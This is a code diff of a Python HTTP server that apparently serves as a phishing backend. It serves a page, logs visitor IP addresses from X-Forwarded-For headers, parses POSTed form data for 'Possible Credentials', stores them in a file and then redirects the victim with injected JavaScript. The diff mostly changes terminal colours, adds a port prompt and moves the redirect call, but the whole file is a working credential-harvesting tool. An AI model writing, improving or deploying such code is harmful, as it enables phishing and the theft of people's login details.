@@ -1,22 +1,24 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from colorama import Fore, Style
+from datetime import datetime
 from io import BytesIO
 import urllib.request
-import logging
 import re
-from datetime import datetime
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     
     ips = []
 
     def run():
-        #Here is where the server runs
-        running = False
-        httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
-        while not running:
-            print('.::Listening on port 8000...\n')
-            httpd.serve_forever()
+        try:
+            running = False
+            port = input(BLUE+BOLD+"Port number: "+ENDC)
+            httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
+            while not running:
+                print(BOLD+BLUE+'.::Listening on port %s...\n'%(port)+ENDC)
+                httpd.serve_forever()
+        except OSError:
+            print(RED+"Adress already in use!\n"+ENDC)
+            quit()
 
     def do_GET(self):
         self.send_response(200)
@@ -26,12 +28,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         for lines in readfile:
             self.wfile.write(lines.encode())
         self.get_ip()
-        try:
-            print(Fore.RED+'[+]IP Found:',self.ips[-1])
-            print(Style.RESET_ALL)
-        except IndexError:
-            pass
-
+        
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         body = self.rfile.read(content_length)
@@ -44,6 +41,11 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def get_ip(self):
         log = str(self.headers).split('\n')
+        try:
+            temp = self.ips[-1]
+        except IndexError:
+            temp = ''
+
         for lines in log:
             if re.search('^'+'X-Forwarded-For',lines):
                 address = lines.split('X-Forwarded-For: ')
@@ -52,14 +54,14 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                     self.ips.append(address[1])
                     file = open('ips.txt','a+')
                     file.write('Date: '+str(date)+' IP: '+str(address[1])+'\n')
-
+        
+        if temp != self.ips[-1]:
+            print(BOLD+RED+'[+]IP Found:',self.ips[-1],ENDC)
+        
     def get_time(self):
         timestamp = 1545730073
         timenow = datetime.fromtimestamp(timestamp)
         return timenow
-
-    def log_message(self, format, *args):
-        logging.error(self.headers)
 
     def getCredentials(self, values):
         post = values.decode('UTF-8')
@@ -75,24 +77,27 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                     possibles.append(line)
                     count +=1
                     if count >= 2:
-                        print('\n' + Fore.RED + "=" * 15 + " Possible Credentials " + "=" * 15)
+                        print('\n' + BOLD+RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                         print('[+].::',possibles)
-                        print("=" * 52 + "\n")
-                        print(Style.RESET_ALL)
+                        print("=" * 52 + "\n"+ENDC)
                         date = self.get_time()
                         file.write(str(date)+' '+str(possibles)+'\n')
                         count = 0
                         possibles = []
+                        self.redirect()
         file.close()
-        print("[!] Redirecting...")
-        self.redirect()
 
     def redirect(self):
         urlf = open('site/redirect.txt','r')
         url = urlf.readlines()
+        print(BLUE+"[!] Redirecting...")
         redir = "<script>window.location.href=\"%s\"</script>" % (url[0])
         self.wfile.write(redir.encode())
-        print('[+] Done!')
+        print('[+] Done!'+ENDC)
 
-if not __name__ == '__main__':
-    SimpleHTTPRequestHandler.run()
+
+'''colors'''
+BLUE = '\033[94m'
+RED = '\033[91m'
+ENDC = '\033[0m'
+BOLD = '\033[1m'
